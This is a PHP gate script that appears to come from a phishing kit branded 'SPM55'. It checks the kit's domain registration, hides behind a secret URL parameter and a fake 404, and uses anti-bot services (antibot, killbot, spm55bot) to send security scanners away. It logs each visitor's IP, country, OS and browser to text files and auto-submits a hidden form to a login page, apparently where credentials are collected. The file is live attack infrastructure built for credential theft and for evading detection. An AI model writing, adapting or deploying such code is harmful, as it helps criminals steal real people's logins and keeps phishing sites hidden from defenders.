<?php
session_start();
require_once('main.php');
require_once('setting-antibot.php');
$random = substr(sha1(mt_rand()),1,25);
if ($check_domain != $domain) {
echo '
<title>SPM55</title>
<link id="favicon" rel="shortcut icon" href="https://i.ibb.co/Zhv168g/logo.png" type="image/png"/>
<div style="padding-top:100px;">
<center>
<img src="https://i.ibb.co/Zhv168g/logo.png" style="border-radius:250px;" width="300" height="300"><br>
<h1>DOMAIN IS NOT REGISTERED!</h1>
</center>
</div>
';
}else{
    if($site_param_on == "on") {
    $secret = $site_parameter;
    $password = $_GET[$secret];
    if(!isset($password)) {
    tulis_file("result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|Does not use parameters");
    exit(header("HTTP/1.0 404 Not Found"));
    }else{
      if ($config_bot['blocker_type'] == "spm55bot" && $config_bot['antibot_status'] == "on") {
            include'blocker/spm55bot.php';
            $SPM55_Antibot = new SPM55;
            $SPM55_Antibot->apikey( $config_bot_setting['apikey'] );
            if($SPM55_Antibot->check() == true){
                tulis_file("result/bot.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BLOCK BY SPM55 ANTIBOT");
                die(header("location: ".$config_bot_setting['bot']));
            }else{
                tulis_file("result/click.txt", $ip);
                echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
            }
        }elseif ($config_bot['blocker_type'] == "antibot" && $config_bot['antibot_status'] == "on") {
            include'blocker/antibot.php';
            $Antibot = new Antibot;
            $Antibot->apikey( $config_bot_setting['apikey'] );
            if($Antibot->check() == true){
                tulis_file("result/bot.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BLOCK BY ANTIBOT");
                die(header("location: ".$config_bot_setting['bot']));
            }else{
                tulis_file("result/click.txt", $ip);
                echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
            }
        }elseif ($config_bot['blocker_type'] == "killbot" && $config_bot['antibot_status'] == "on") {
            include'blocker/killbot.php';
            $Killbot = new Killbot;
            $Killbot->apikey( $config_bot_setting['apikey'] );
            if($Killbot->check() == true){
                tulis_file("result/bot.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BLOCK BY KILLBOT");
                die(header("location: ".$config_bot_setting['bot']));
            }else{
                tulis_file("result/click.txt", $ip);
                echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
            }
        }else{
            tulis_file("result/click.txt", $ip);
            echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
        }
    }
}else{
    if ($config_bot['blocker_type'] == "spm55bot" && $config_bot['antibot_status'] == "on") {
            include'blocker/spm55bot.php';
            $SPM55_Antibot = new SPM55;
            $SPM55_Antibot->apikey( $config_bot_setting['apikey'] );
            if($SPM55_Antibot->check() == true){
                tulis_file("result/bot.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BLOCK BY SPM55 ANTIBOT");
                die(header("location: ".$config_bot_setting['bot']));
            }else{
                tulis_file("result/click.txt", $ip);
                echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
            }
        }elseif ($config_bot['blocker_type'] == "antibot" && $config_bot['antibot_status'] == "on") {
            include'blocker/antibot.php';
            $Antibot = new Antibot;
            $Antibot->apikey( $config_bot_setting['apikey'] );
            if($Antibot->check() == true){
                tulis_file("result/bot.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BLOCK BY ANTIBOT");
                die(header("location: ".$config_bot_setting['bot']));
            }else{
                tulis_file("result/click.txt", $ip);
                echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
            }
        }elseif ($config_bot['blocker_type'] == "killbot" && $config_bot['antibot_status'] == "on") {
            include'blocker/killbot.php';
            $Killbot = new Killbot;
            $Killbot->apikey( $config_bot_setting['apikey'] );
            if($Killbot->check() == true){
                tulis_file("result/bot.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|BLOCK BY KILLBOT");
                die(header("location: ".$config_bot_setting['bot']));
            }else{
                tulis_file("result/click.txt", $ip);
                echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
            }
        }else{
            tulis_file("result/click.txt", $ip);
            echo "<form id='boyxd' method='POST' action='login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
        }
}
}
?>